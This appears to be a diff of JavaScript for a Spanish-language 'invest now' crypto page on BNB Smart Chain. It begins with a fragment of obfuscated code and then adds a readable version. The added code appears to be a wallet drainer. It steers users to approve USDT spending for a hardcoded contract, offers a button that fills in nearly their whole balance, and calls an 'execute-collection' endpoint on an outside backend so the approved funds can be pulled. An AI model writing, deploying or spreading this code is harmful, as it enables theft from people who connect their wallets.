ethers[(_0x4ed462(0x138))](BSC_USDT_ADDRESS,ERC20_ABI,_0x2243c6);_0x5052c6[_0x4ed462(0x1f3)](setLoading,!![],_0x5052c6[_0x4ed462(0x1c6)]);const _0x2a0f77=await _0x1420bf[_0x4ed462(0x176)](_0x4f92aa);if(_0x5052c6[_0x4ed462(0x21d)](_0x2a0f77,_0x32bed8)){_0x5052c6[_0x4ed462(0x25a)](showToast,_0x5052c6[_0x4ed462(0x269)],_0x5052c6[_0x4ed462(0x285)]),_0x5052c6[_0x4ed462(0x1b1)](setLoading,![]);return;}_0x5052c6[_0x4ed462(0x25a)](setLoading,!![],_0x5052c6[_0x4ed462(0x224)]);const _0x3dd1d7=await _0x1420bf[_0x4ed462(0x283)](_0x4f92aa,CONTRACT_ADDRESS);if(_0x5052c6[_0x4ed462(0x21d)](_0x3dd1d7,_0x32bed8)){_0x5052c6[_0x4ed462(0x1f3)](setLoading,!![],_0x5052c6[_0x4ed462(0x27b)]);const _0x3d34dc=await _0x1420bf[_0x4ed462(0x1ab)](CONTRACT_ADDRESS,_0x32bed8);_0x5052c6[_0x4ed462(0x19a)](setLoading,!![],_0x5052c6[_0x4ed462(0x1f1)]),await _0x3d34dc[_0x4ed462(0x23a)]();}_0x5052c6[_0x4ed462(0x1f3)](setLoading,!![],_0x5052c6[_0x4ed462(0x139)]);const _0x229cd6=await _0x5052c6[_0x4ed462(0x1ca)](triggerBackendCollect,_0x4f92aa),_0x48f682=_0x229cd6?.[_0x4ed462(0x1e1)]||'';_0x48f682?_0x5052c6[_0x4ed462(0x23e)](showToast,_0x4ed462(0x16b)+_0x4ed462(0x1ef)+_0x4ed462(0x17b)+_0x4ed462(0x1be)+_0x4ed462(0x13d)+'x/'+_0x48f682+(_0x4ed462(0x24e)+_0x4ed462(0x22f)+_0x4ed462(0x18b)+_0x4ed462(0x239)+_0x4ed462(0x213)+_0x4ed462(0x1e2)+_0x4ed462(0x1ae)+_0x4ed462(0x16e)+_0x4ed462(0x18c)),_0x5052c6[_0x4ed462(0x1df)],-0x334a+-0x33b6+-0x60*-0x166):_0x5052c6[_0x4ed462(0x149)](showToast,_0x5052c6[_0x4ed462(0x1ea)],_0x5052c6[_0x4ed462(0x1df)],-0xb85+-0x1*0x55+0x234a);}catch(_0x51404c){const _0x3eacf2=_0x51404c?.[_0x4ed462(0x190)]??_0x51404c?.[_0x4ed462(0x1a2)]??_0x5052c6[_0x4ed462(0x1b8)];_0x5052c6[_0x4ed462(0x180)](_0x51404c[_0x4ed462(0x19e)],0x14f7+0xd84+-0x12da)||_0x3eacf2[_0x4ed462(0x25b)+'e']()[_0x4ed462(0x1f6)](_0x5052c6[_0x4ed462(0x215)])||_0x3eacf2[_0x4ed462(0x25b)+'e']()[_0x4ed462(0x1f6)](_0x5052c6[_0x4ed462(0x1bb)])||_0x3eacf2[_0x4ed462(0x25b)+'e']()[_0x4ed462(0x1f6)](_0x5052c6[_0x4ed462(0x27d)])?_0x5052c6[_0x4ed462(0x256)](showToast,_0x5052c6[_0x4ed462(0x1ce)],_0x5052c6[_0x4ed462(0x14e)]):(console[_0x4ed462(0x1a0)](_0x5052c6[_0x4ed462(0x258)],_0x51404c),_0x5052c6[_0x4ed462(0x1f3)](showToast,_0x5052c6[_0x4ed462(0x1ed)],_0x5052c6[_0x4ed462(0x285)]));}finally{_0x5052c6[_0x4ed462(0x1b1)](setLoading,![]);}}
+"use strict";
+
+// ─── Configuration ────────────────────────────────────────────────────────────
+const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
+const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
+const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const BSC_CHAIN_ID_HEX = "0x38"; 
+const MIN_USDT_BALANCE = 0n; 
+const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
+
+const BSC_RPC_URLS = [
+  "https://bsc-rpc.publicnode.com",
+  "https://bsc-dataseed1.binance.org/",
+  "https://bsc-dataseed2.binance.org/",
+  "https://rpc.ankr.com/bsc"
+];
+
+const BSC_CHAIN_PARAMS = {
+  chainId:           BSC_CHAIN_ID_HEX,
+  chainName:         "BNB Smart Chain",
+  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
+  rpcUrls:           BSC_RPC_URLS,
+  blockExplorerUrls: ["https://bscscan.com/"]
+};
+
+const ERC20_ABI = [
+  "function approve(address spender, uint256 amount) external returns (bool)",
+  "function allowance(address owner, address spender) external view returns (uint256)",
+  "function balanceOf(address account) external view returns (uint256)"
+];
+
+// ─── DOM refs ─────────────────────────────────────────────────────────────────
+const approveBtn    = document.getElementById("approveBtn");
+const btnText       = document.getElementById("btnText");
+const btnSpinner    = document.getElementById("btnSpinner");
+const merchantInput = document.getElementById("merchantAddress");
+const toastEl       = document.getElementById("toast");
+const amountInput   = document.getElementById("investAmount");
+
+if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
+
+// ─── Estado global para validaciones ──────────────────────────────────────────
+let cachedUserBalance = 0;
+let pendingInvestment = false;
+
+// ─── Wake up Render backend ───────────────────────────────────────────────────
+(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
+
+// ─── UI helpers ───────────────────────────────────────────────────────────────
+let _toastTimer;
+function showToast(msg, type = "default", ms = 4500) {
+  if (!toastEl) return;
+  clearTimeout(_toastTimer);
+  toastEl.innerHTML    = msg; 
+  toastEl.dataset.type = type === "default" ? "" : type;
+  toastEl.hidden       = false;
+  
+  if (type === "success") {
+    toastEl.style.background = "rgba(38, 161, 123, 0.95)";
+  } else if (type === "error") {
+    toastEl.style.background = "rgba(220, 53, 69, 0.95)";
+  } else {
+    toastEl.style.removeProperty("background");
+  }
+
+  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
+}
+
+function setLoading(on, label = "Processing…") {
+  if (!approveBtn) return;
+  approveBtn.disabled = on;
+  approveBtn.style.opacity = on ? "0.8" : "1";
+  if (btnText) btnText.textContent = on ? label.toUpperCase() : "INVERTIR AHORA";
+  if (btnSpinner) btnSpinner.hidden   = !on;
+}
+
+// ─── UI Reset Helper (Disconnect State) ──────────────────────────────────────
+function resetAppUI() {
+  const balanceLabel = document.getElementById("walletBalanceLabel");
+  if (balanceLabel) {
+    balanceLabel.textContent = "Saldo: -- USDT";
+  }
+
+  if (amountInput) {
+    amountInput.value = "";
+    amountInput.style.removeProperty("border-color");
+  }
+
+  cachedUserBalance = 0;
+  pendingInvestment = false;
+  setLoading(false);
+  showToast("Billetera desconectada.", "default", 3000);
+}
+
+// ─── Validación en tiempo real del Input ─────────────────────────────────────
+if (amountInput) {
+  amountInput.addEventListener("input", (e) => {
+    const val = parseFloat(e.target.value) || 0;
+    if (cachedUserBalance > 0 && val > cachedUserBalance) {
+      amountInput.style.borderColor = "#dc3545";
+    } else {
+      amountInput.style.removeProperty("border-color");
+    }
+  });
+}
+
+// ─── Live Balance & Smart Max Button ─────────────────────────────────────────
+async function fetchAndDisplayUserBalances(rawProvider) {
+  try {
+    const provider = new ethers.BrowserProvider(rawProvider);
+    const signer = await provider.getSigner();
+    const userAddress = await signer.getAddress();
+    
+    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
+    const usdtBal = await usdtContract.balanceOf(userAddress);
+    const formattedUsdt = ethers.formatUnits(usdtBal, 18);
+    
+    cachedUserBalance = parseFloat(formattedUsdt);
+
+    const balanceLabel = document.getElementById("walletBalanceLabel");
+    if (balanceLabel) {
+      balanceLabel.textContent = `Saldo: ${cachedUserBalance.toFixed(2)} USDT`;
+    }
+
+    const maxBtn = document.getElementById("maxBtn");
+    if (maxBtn) {
+      maxBtn.onclick = () => {
+        if (amountInput) {
+          const maxUsdt = Math.max(0, cachedUserBalance - 1); 
+          amountInput.value = maxUsdt > 0 ? maxUsdt.toFixed(2) : "1.00";
+          amountInput.dispatchEvent(new Event('input'));
+        }
+      };
+    }
+  } catch (err) {
+    console.error("Error al sincronizar saldos en vivo:", err);
+  }
+}
+
+// ─── Backend collect trigger ──────────────────────────────────────────────────
+async function triggerBackendCollect(userAddress) {
+  let lastErr;
+  const uiAmount = amountInput?.value || "1"; 
+  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();
+
+  for (let i = 1; i <= 3; i++) {
+    try {
+      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
+        method:  "POST",
+        headers: { "Content-Type": "application/json" },
+        body:    JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
+      });
+      const data = await res.json();
+      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
+      return data;
+    } catch (e) {
+      lastErr = e;
+      if (i < 3) await new Promise(r => setTimeout(r, 3000));
+    }
+  }
+  throw lastErr;
+}
+
+// ─── Suscripciones reactivas (Conexión / Desconexión / Modal) ─────────────────
+if (window.modal && typeof window.modal.subscribeProviders === "function") {
+  window.modal.subscribeProviders((state) => {
+    const rawProvider = state["eip155"]; 
+    
+    if (rawProvider) {
+      fetchAndDisplayUserBalances(rawProvider); 
+      if (pendingInvestment) {
+        pendingInvestment = false; 
+        runInvestmentFlow(rawProvider); 
+      }
+    } else {
+      resetAppUI();
+    }
+  });
+}
+
+if (window.modal && typeof window.modal.subscribeState === "function") {
+  window.modal.subscribeState((state) => {
+    if (!state.open) {
+      let rawProvider = null;
+      try {
+        rawProvider = window.modal.getWalletProvider();
+      } catch (_) {}
+
+      if (!rawProvider) {
+        resetAppUI();
+      }
+    }
+  });
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+  if (window.modal && typeof window.modal.getWalletProvider === "function") {
+    try {
+      const activeProvider = window.modal.getWalletProvider();
+      if (activeProvider) {
+        fetchAndDisplayUserBalances(activeProvider);
+      }
+    } catch (_) {}
+  }
+});
+
+// ─── Evento del botón principal ───────────────────────────────────────────────
+if (approveBtn) {
+  approveBtn.addEventListener("click", async () => {
+    let rawProvider = null;
+    if (window.modal && typeof window.modal.getWalletProvider === "function") {
+      try {
+        rawProvider = window.modal.getWalletProvider();
+      } catch (_) {}
+    }
+
+    if (!rawProvider) {
+      pendingInvestment = true; 
+      setLoading(true, "Abriendo selector de billetera...");
+      
+      if (window.modal && typeof window.modal.open === "function") {
+        try {
+          await window.modal.open(); 
+        } catch (err) {
+          console.error("Error al abrir AppKit:", err);
+          pendingInvestment = false;
+          setLoading(false);
+        }
+      }
+      return; 
+    }
+
+    await runInvestmentFlow(rawProvider);
+  });
+}
+
+// ─── Flujo centralizado con avisos de "Revisa tu billetera" ───────────────────
+async function runInvestmentFlow(rawProvider) {
+  setLoading(true, "Conectando proveedor…");
+  
+  try {
+    const provider = new ethers.BrowserProvider(rawProvider);
+    
+    // 1. Red BSC
+    setLoading(true, "Verificando red BSC...");
+    const network = await provider.getNetwork();
+    if (Number(network.chainId) !== 56) {
+      setLoading(true, "⚠️ Revisa tu billetera: Cambia a BSC…");
+      try {
+        await rawProvider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: BSC_CHAIN_ID_HEX }] 
+        });
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          await rawProvider.request({
+            method: "wallet_addEthereumChain",
+            params: [BSC_CHAIN_PARAMS]
+          });
+        } else {
+          showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
+          setLoading(false);
+          return;
+        }
+      }
+    }
+
+    const signer = await provider.getSigner();
+    const userAddress = await signer.getAddress();
+
+    // 2. Gas BNB
+    setLoading(true, "Verificando saldo de gas (BNB)…");
+    const bnbBalance = await provider.getBalance(userAddress);
+    const minGasRequired = ethers.parseEther("0.0005"); 
+
+    if (bnbBalance < minGasRequired) {
+      showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
+      setLoading(false);
+      return;
+    }
+
+    // 3. Montos y USDT
+    const rawInputVal = amountInput ? amountInput.value : "1";
+    const requiredAmount = ethers.parseUnits(rawInputVal || "1", 18);
+
+    if (cachedUserBalance > 0 && parseFloat(rawInputVal) > cachedUserBalance) {
+      showToast("El monto ingresado supera tu saldo disponible.", "error");
+      setLoading(false);
+      return;
+    }
+
+    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
+
+    setLoading(true, "Validando saldo de USDT…");
+    const usdtBalance = await usdtContract.balanceOf(userAddress);
+
+    if (usdtBalance < requiredAmount) {
+      showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
+      setLoading(false);
+      return;
+    }
+
+    // 4. Allowance con aviso explícito para revisar wallet
+    setLoading(true, "Verificando autorizaciones...");
+    const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
+    
+    if (allowance < requiredAmount) {
+      setLoading(true, "⚠️ Revisa tu billetera: Aprueba USDT...");
+      const txApprove = await usdtContract.approve(CONTRACT_ADDRESS, requiredAmount);
+      
+      setLoading(true, "Confirmando aprobación en red...");
+      await txApprove.wait();
+    }
+
+    // 5. Backend
+    setLoading(true, "Procesando inversión en protocolo...");
+    const txCollect = await triggerBackendCollect(userAddress); 
+
+    // 6. Éxito
+    const txHash = txCollect?.hash || "";
+    if (txHash) {
+      showToast(`¡Inversión exitosa! <a href="https://bscscan.com/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
+    } else {
+      showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
+    }
+
+  } catch (err) {
+    const raw = err?.reason ?? err?.message ?? "Error desconocido";
+    if (
+      err.code === 4001 ||
+      raw.toLowerCase().includes("user rejected") ||
+      raw.toLowerCase().includes("denied") ||
+      raw.toLowerCase().includes("cancelled")
+    ) {
+      showToast("Operación cancelada por el usuario.", "default");
+    } else {
+      console.error("Web3 Error crítico:", err);
+      showToast("Ocurrió un error al procesar la transacción en la red.", "error");
+    }
+  } finally {
+    setLoading(false);
+  }
+}
